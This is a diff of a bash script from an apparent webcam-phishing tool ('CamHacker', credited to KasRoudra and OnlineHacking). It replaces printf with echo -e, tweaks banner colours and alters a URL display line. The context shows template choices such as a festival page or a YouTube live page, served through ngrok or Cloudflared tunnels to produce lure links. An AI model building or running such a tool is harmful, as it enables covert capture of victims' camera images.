@@ -132,7 +132,7 @@ replacer() {
         break
     fi
     done
-    echo -e "${info}Your urls are: ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \n"
+    echo -e "${info}Your urls are: Null \n"
     sleep 1
     echo -e "${success}Link 1 Berhasil Cuk : ${1}\n"
     sleep 1
@@ -276,7 +276,7 @@ fi
 if $termux; then
     path=`pwd`
     if echo "$path" | grep -q "home"; then
-        printf ""
+        echo ""
     else
         echo -e "${error}Invalid directory. Run from home!\007\n"
         killer; exit 1
@@ -367,7 +367,7 @@ fi
 # Ngrok Authtoken
 if ! [[ -e $HOME/.ngrok2/ngrok.yml ]]; then
     echo -e "\n${ask}Enter your ngrok authtoken (Enter to Skip):"
-    printf "${cyan}\nOnline${nc}@${cyan}Hacking ${red}$ ${nc}"
+    echo -e "${cyan}\nOnline${nc}@${cyan}Hacking ${red}$ ${nc}"
     read auth
     if [ -z $auth ]; then
         echo -e "\n${error}No authtoken!\n\007"
@@ -381,16 +381,16 @@ fi
 while true; do
 clear
 echo -e
-echo -e$red"『"  $green"╦ ╦╔═╗╔═╗╦╔═  ╦╔═╔═╗╔╦╗╔═╗╦═╗╔═╗"$blue"
-echo -e    ╠═╣╠═╣║  ╠╩╗  ╠╩╗╠═╣║║║║╣ ╠╦╝╠═╣
-echo -e    ╩ ╩╩ ╩╚═╝╩ ╩  ╩ ╩╩ ╩╩ ╩╚═╝╩╚═╩ ╩"  $red"』"
+echo -e$red"『"  $green"╦ ╦╔═╗╔═╗╦╔═  ╦╔═╔═╗╔╦╗╔═╗╦═╗╔═╗"
+echo -e   $blue" ╠═╣╠═╣║  ╠╩╗  ╠╩╗╠═╣║║║║╣ ╠╦╝╠═╣"
+echo -e    $blue"╩ ╩╩ ╩╚═╝╩ ╩  ╩ ╩╩ ╩╩ ╩╚═╝╩╚═╩ ╩"  $red"』"
 echo -e
 sleep 1
 
 bash OnlineHacking/logo2.sh
 
 sleep 1
-printf "${cyan}\nKONCOL${nc}@${cyan}MEMEG ${red}AMSU ${nc}"
+echo -e "${cyan}\nKONCOL${nc}@${cyan}MEMEG ${red}AMSU ${nc}"
 read option
 # Select template
     if echo $option | grep -q "1"; then
@@ -398,7 +398,7 @@ read option
         break
     elif echo $option | grep -q "2"; then
         dir="fest"
-        printf "\n${ask}Enter festival name:${cyan}\n\nKONCOL${nc}@${cyan}MEMEG ${red}AMSU ${nc}"
+        echo -e "\n${ask}Enter festival name:${cyan}\n\nKONCOL${nc}@${cyan}MEMEG ${red}AMSU ${nc}"
         read fest_name
         if [ -z $fest_name ]; then
             echo -e "\n${error}Invalid input!\n\007"
@@ -409,7 +409,7 @@ read option
         fi
     elif echo $option | grep -q "3"; then
         dir="live"
-        printf "\n${ask}Enter youtube video ID:${cyan}\n\nKONCOL${nc}@${cyan}MEMEG ${red}AMSU ${nc}"
+        echo -e "\n${ask}Enter youtube video ID:${cyan}\n\nKONCOL${nc}@${cyan}MEMEG ${red}AMSU ${nc}"
         read vid_id
         if [ -z $vid_id ]; then
             echo -e "\n${error}Invalid input!\n\007"
@@ -427,7 +427,7 @@ read option
             export TN="Cloudflared"
         fi
     elif echo $option | grep -q "i"; then
-        printf "\n${ask}Enter Directory:${cyan}\n\nKONCOL${nc}@${cyan}MEMEG ${red}AMSU ${nc}"
+        echo -e "\n${ask}Enter Directory:${cyan}\n\nKONCOL${nc}@${cyan}MEMEG ${red}AMSU ${nc}"
         read dire
         if ! [ -d $dire ]; then
             echo -e "\n${error}Invalid directory!\n\007"
@@ -447,7 +447,7 @@ $red[Author]     ${cyan} :[KasRoudra, Suman, OnlineHacking]
 $red[Github]     ${cyan} :[https://github.com/OnlineHacKing] 
 $red[Website]    ${cyan} :[https://www.onlinehacking.in/]
 $red[Telegarm]   ${cyan} :[https://t.me/onlinehacking]"
-printf "${cyan}\nCam${nc}@${cyan}Hacker ${red}$ ${nc}"
+echo -e "${cyan}\nCam${nc}@${cyan}Hacker ${red}$ ${nc}"
 read about
     elif echo $option | grep -q "m"; then
         xdg-open "https://www.facebook.com/profile.php?id=100077142458119"
